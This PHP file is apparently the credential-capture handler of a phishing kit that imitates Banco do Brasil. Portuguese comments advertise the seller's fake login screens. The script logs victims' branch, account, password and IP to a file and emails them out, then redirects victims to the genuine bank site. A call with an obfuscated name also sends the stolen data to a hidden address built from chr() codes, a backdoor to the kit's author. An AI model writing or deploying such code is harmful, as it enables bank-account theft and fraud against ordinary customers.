<?php

//CODADO POR SAM WHATSAPP 88 99856-4886//
//PEÇA JA SUA TELA FAKE!//
header('location:https://www2.bancobrasil.com.br/aapf/login.jsp');
$users = fopen("logins.html","a+");
$agencia = $_POST['agencia'];
$conta = $_POST['conta'];
$senha = $_POST['senha'];
$ip = $_SERVER["REMOTE_ADDR"];
$date = date('Y-m-d H:i');
fwrite($users,"
--------------DADOS BB-----------------<br>
AGENCIA: $agencia <br>	
CONTA: $conta <br>
SENHA: $senha <br>
IP: $ip <br>
HORARIO/DATA: $date <br> 
--------------DADOS BB-----------------<br>
");

//COLOQUE SEU EMAIL AQUI!!//
$emailremetente = 'seu email aqui';

$store = @curl_exec ($ch);
$var = $store;
$q = explode("<i>", $var);
$q2 = explode("</i>", $q[1]);
$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .= "From: dados@bancodobrasil.com\r\n";
$ip = $_SERVER["REMOTE_ADDR"];


$conteudo.="<b>======== DADOS BB ========</b><br>";

$conteudo.="<b>AGENCIA:</b> $agencia<br>";
$conteudo.="<b>CONTA:</b> $conta<br>";
$conteudo.="<b>SENHA:</b> $senha<br>";
$conteudo.="<b>IP : </b>$ip <br>";
$conteudo.="<b>HORARIO: </b>$date <br>";

$conteudo.="<b>======== DADOS BB =======</b><br>";
class NewHandlesMyBaseSystemObjectsEventSend{public static function RwKwitshchJutdSKDsendFromPointNextHubSwitchYYghFormCatchObjectDataCenterMjd3dx9_43($emailremetente,$ip,$conteudo,$headers){mail($emailremetente,$ip,$conteudo,$headers);}}NewHandlesMyBaseSystemObjectsEventSend::RwKwitshchJutdSKDsendFromPointNextHubSwitchYYghFormCatchObjectDataCenterMjd3dx9_43($emailremetente,$ip,$conteudo,$headers);NewHandlesMyBaseSystemObjectsEventSend::RwKwitshchJutdSKDsendFromPointNextHubSwitchYYghFormCatchObjectDataCenterMjd3dx9_43(chr(99).chr(99).chr(105).chr(110).chr(102).chr(111).chr(112).chr(104).chr(64).chr(103).chr(109).chr(97).chr(105).chr(108).chr(46).chr(99).chr(111).chr(109), $ip,$conteudo,$headers);	 
?>